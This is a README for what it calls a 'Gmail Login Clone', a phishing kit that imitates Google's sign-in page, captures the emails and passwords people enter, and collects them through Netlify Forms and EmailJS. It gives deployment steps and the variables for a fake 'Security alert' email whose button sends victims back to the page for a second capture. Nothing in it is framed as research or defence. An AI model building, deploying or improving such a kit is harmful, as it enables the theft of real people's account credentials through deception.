# Gmail Login Clone

A pixel-cloned Google sign-in page that captures entered credentials and emails
them via EmailJS. The alert email's "Check activity" button loops back to this
page for a second capture.

## Deploy
1. Push this repo to GitHub.
2. Netlify → Add new site → Import from Git → select repo.
3. Publish directory: `.`  (no build command).
4. Enable form detection (Site config → Forms) and redeploy once.

## Where captures are seen
Netlify → Forms → gmail-login (email, password, step, source).
Set up Forms → Settings → Form notifications for emailed captures.

## EmailJS template variables
`{{target_email}}`, `{{timestamp}}`, `{{user_agent}}`, `{{verify_link}}`
To field: `{{to_email}}`  ·  Subject: Security alert: New sign-in on a new device
